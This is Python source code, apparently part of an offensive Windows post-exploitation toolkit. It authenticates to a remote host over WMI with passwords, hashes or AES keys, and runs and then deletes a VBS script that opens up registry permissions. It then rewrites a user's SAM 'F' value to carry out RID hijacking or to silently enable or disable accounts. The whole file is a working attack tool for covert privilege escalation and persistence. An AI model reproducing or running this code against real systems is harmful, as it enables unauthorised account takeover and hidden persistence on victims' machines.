import os
import uuid
import time
from module import *
from module import files
from module import vbsrun
from module import wmiconnect

inipath=os.path.join(os.getcwd(),"output","regini.ini")
def rid_teample_create(src_rid,target_rid,id=0):
    pass

def hex_set(b,target_rid,isenable=0):
    tmp = []
    result = []
    for x in b:
        tmp.append(x)
        if len(tmp) == 4:
            jj = ""
            for c in tmp[::-1]:
                jj += "%.2x" % c
            result.append(eval("0x{}".format(jj)))
            tmp = []
    for number in range(80 - len(result)):
        result.append(0)
    result[12]=eval("int(0x{})".format(target_rid)) #用户rid设置
    if isenable==1:
        result[14] = 532 #开启用户 532为用户开启/533用户关闭
    else:
        result[14]=533

    return result

def user_set(ip='', username='', password='',domain='',hashes='',aesKey='',rids=""):
    rid_sp = rids.split(",")
    if len(rid_sp)!=2:
        print("[-] --setuser <rid>,1/0")
        exit()
    rid=rid_sp[0]
    isenable=int(rid_sp[1])
    if isenable==1:
        txt="Enable User rid:{} Sucess".format(rid)
    else:
        txt="Disable User rid:{} Sucess".format(rid)
    rid_teample_create(rid,0,1)
    vbsid = str(uuid.uuid1())
    teamp_vbs_path = os.path.join(os.getcwd(), "vbs", "reg_permission.vbs")
    output_vbs_path = os.path.join(os.getcwd(), "output", "reg_permission.vbs")
    tmp = open(teamp_vbs_path, "r", encoding="utf-8").read()
    newfile = open(output_vbs_path, "w", encoding="utf-8")
    newfile.write(tmp)
    newfile.close()
    vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey, output_vbs_path, vbsid)
    time.sleep(2.5)
    vbsrun.delete(ip, username, password, domain, hashes, aesKey, vbsid)
    dcom, iWbemLevel1Login = wmiconnect.wmiconnect(ip, username, password, domain, hashes, aesKey)
    iWbemLevel1Login.RemRelease()
    iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
    StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
    rest = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\00000{}'.format(rid_sp[0]), 'F')
    ReturnValue = rest.ReturnValue
    if int(ReturnValue) == 0:
        uvalue = rest.uValue
        result_value = hex_set(uvalue, rid,isenable=isenable)
        print(result_value)
        out = StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\00000{}'.format(rid), 'F',result_value)
        if int(out.ReturnValue) == 0:
            print(txt)
        else:
            print(txt.replace("Sucess","Failure"))
    else:
        print("[-] Registry permission modification failed Error Code:{}".format(ReturnValue))
        dcom.disconnect()
    dcom.disconnect()

def run(ip='', username='', password='',domain='',hashes='',aesKey='',ridlist=""):
    rid_sp=ridlist.split(",")
    if len(rid_sp)!=2:
        print("[-] --ridhijack <src_user_rid>,<target_user_rid>")
        exit()
    rid_teample_create(rid_sp[0],rid_sp[1])
    vbsid = str(uuid.uuid1())
    teamp_vbs_path = os.path.join(os.getcwd(), "vbs", "reg_permission.vbs")
    output_vbs_path = os.path.join(os.getcwd(), "output", "reg_permission.vbs")
    tmp = open(teamp_vbs_path, "r", encoding="utf-8").read()
    newfile = open(output_vbs_path, "w", encoding="utf-8")
    newfile.write(tmp)
    newfile.close()
    vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey, output_vbs_path, vbsid)
    time.sleep(2.5)
    vbsrun.delete(ip, username, password, domain, hashes, aesKey, vbsid)
    dcom, iWbemLevel1Login = wmiconnect.wmiconnect(ip, username, password, domain, hashes, aesKey)
    iWbemLevel1Login.RemRelease()
    iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
    StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
    rest = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\00000{}'.format(rid_sp[0]), 'F')
    ReturnValue=rest.ReturnValue
    if int(ReturnValue)==0:
         uvalue=rest.uValue
         result_value=hex_set(uvalue,rid_sp[1])
         print(result_value)
         out=StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\00000{}'.format(rid_sp[0]), 'F', result_value)
         if int(out.ReturnValue)==0:
             print("[+] RID Hijack Sucess")
         else:
             print("[-] RID Hijack Failure ErrorCode:{}".format(int(out.ReturnValue)))
    else:
        print("[-] Registry permission modification failed Error Code:{}".format(ReturnValue))
        dcom.disconnect()
    dcom.disconnect()